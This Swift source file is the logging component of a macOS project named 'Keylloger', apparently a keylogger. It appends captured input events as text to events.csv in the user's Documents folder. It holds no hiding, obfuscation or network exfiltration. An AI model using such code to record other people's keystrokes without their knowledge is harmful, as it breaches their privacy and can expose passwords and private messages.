//
//  Logger.swift
//  Keylloger
//
//  Created by Vitor Silva on 11/03/20.
//  Copyright © 2020 Vitor Silva. All rights reserved.
//

import AppKit
import Combine

class Logger {
    var record = false
    
    func writeEvent(_ event: NSEvent) {
        if record {
            print(event)
            let data = "\(event)\n".data(using: .utf8)!
            do {
                // get the documents folder url
                if let documentDirectory = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first {
                    // create the destination url for the text file to be saved
                    let fileURL = documentDirectory.appendingPathComponent("events.csv")
                    if !FileManager.default.fileExists(atPath: fileURL.path) {
                        FileManager.default.createFile(atPath: fileURL.path, contents: nil, attributes: [:])
                    }
                    // define the string/text to be saved
                    // writing to disk
                    // Note: if you set atomically to true it will overwrite the file if it exists without a warning
                    let fileHanlder = try FileHandle(forWritingTo: fileURL)
                    fileHanlder.seekToEndOfFile()
                    fileHanlder.write(data)
                    try fileHanlder.close()
                    print("saving was successful")
                }
            } catch {
                print("error:", error)
            }
        }
    }
}

/*
 let path = "\(homeDirURL)Documents/events.csv"
 var file = FileHandle(forWritingAtPath: path)
 if file == nil {
     FileManager.default.createFile(atPath: path, contents: nil, attributes: [:])
     file = FileHandle(forWritingAtPath: path)
 }
 file?.seekToEndOfFile()
 file?.write(data)
 try! file?.close()
 */
